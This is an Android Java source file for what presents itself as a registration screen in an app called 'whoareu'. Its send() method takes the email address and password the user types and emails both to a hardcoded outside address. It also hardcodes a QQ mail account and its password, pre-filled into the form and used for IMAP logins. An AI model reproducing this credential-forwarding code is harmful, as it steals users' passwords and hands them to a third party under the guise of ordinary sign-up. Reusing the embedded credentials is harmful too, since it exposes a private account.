
package kaizone.songfeng.whoareu.activity;

import java.io.IOException;
import java.io.InputStream;

import javax.mail.MessagingException;
import javax.mail.Store;
import javax.mail.internet.AddressException;

import kaizone.songfeng.whoareu.R;
import kaizone.songfeng.whoareu.WhoApplication;
import kaizone.songfeng.whoareu.c.VortexRuner;
import kaizone.songfeng.whoareu.c.VortexRuner.ITask;
import kaizone.songfeng.whoareu.util.Mail;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.protocol.HTTP;

import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class RegisterActivity extends BaseActivity {

    public static final String TAG = RegisterActivity.class.getName();

    private EditText mUserEdit;
    private EditText mPwdEdit;
    private Button mYesEdit;

    private VortexRuner mRuner;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.who_register);

        mUserEdit = (EditText) findViewById(R.id.edit01);
        mPwdEdit = (EditText) findViewById(R.id.edit02);

        mUserEdit.setText("596760835@qq.com");
        mPwdEdit.setText("19891005aa");

        mYesEdit = (Button) findViewById(R.id.btn01);
        mYesEdit.setOnClickListener(new OnClickListener() {

            int count = 0;

            @Override
            public void onClick(View v) {
                mRuner.post(new ITask() {

                    @Override
                    public Object onBackstage() {
                        // TODO Auto-generated method stub
                        return null;
                    }

                    @Override
                    public void onUI(Object obj) {
                        mUserEdit.append(obj.toString() + "\n");
                    }
                });

            }
        });

    }

    public void send() {
        String addr = mUserEdit.getText().toString();
        String pass = mPwdEdit.getText().toString();
        String subject = addr + "信息";
        String text = addr + "\n" + pass;
        String toAddr = "yuekaizong@163.com";
        String host = "smtp.qq.com";
        try {
            Mail.send(addr, pass, host, toAddr, subject, text);
        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    public void store() {
        String addr = "596760835";
        String pass = "19891005aa";

        try {
            Store store = Mail.imap(addr, pass, "imap.qq.com");
            Mail.resolve(store);
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    public Store store2() {
        String addr = "596760835";
        String pass = "19891005aa";

        try {
            Store store = Mail.imap(addr, pass, "imap.qq.com");
            return store;
        } catch (MessagingException e) {
            e.printStackTrace();
        }
        return null;
    }

    public InputStream url() {
        HttpGet request = new HttpGet("http://code.google.com/p/javamail-android/");
        request.addHeader("charset", HTTP.UTF_8);
        HttpClient client = new DefaultHttpClient();
        InputStream in = null;
        HttpResponse response = null;
        try {
            response = client.execute(request);
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
            HttpEntity entity = response.getEntity();
            try {
                in = entity.getContent();
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return in;
    }

}
